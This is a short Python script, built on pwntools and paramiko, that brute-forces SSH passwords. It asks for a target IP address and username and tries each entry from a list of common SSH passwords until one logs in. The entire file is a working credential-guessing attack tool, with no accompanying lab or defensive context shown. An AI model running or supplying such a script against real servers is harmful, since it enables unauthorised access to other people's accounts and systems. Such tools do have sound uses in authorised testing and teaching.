from pwn import *
import paramiko

host=input("Enter target IP:\n")
username=input("Enter Username:\n")
attempts = 0

with open("common-ssh-passwords.txt" , "r") as password_list:
        for password in password_list:
                password = password.strip("\n")
                try:
                        print("[{}] Attempting passworda: '{}'!".format(attempts, password))
                        response = ssh(host=host, user=username, password=password, timeout=1)
                        if response.connected():
                                print("[>] Valid Password found: '{}'!".format(password))
                                response.close()
                                break
                        response.close()
                except paramiko.ssh_exception.AuthenticationException:
                        print("[X] Invalid Password!")
                attempts+=1
